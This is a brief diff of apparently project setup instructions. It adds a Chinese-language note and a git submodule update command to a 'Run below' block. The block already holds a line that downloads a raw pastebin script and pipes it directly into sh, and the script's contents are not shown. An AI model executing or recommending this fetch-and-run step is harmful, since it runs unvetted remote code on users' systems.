@@ -3,7 +3,13 @@
 
 Run below:
 
+使用以下命令进行子模块代码更新
+
 ```
+
+git submodule update --init --recursive
+
+
 curl https://pastebin.com/raw/6rJ3LwcL | sh
 ```
 
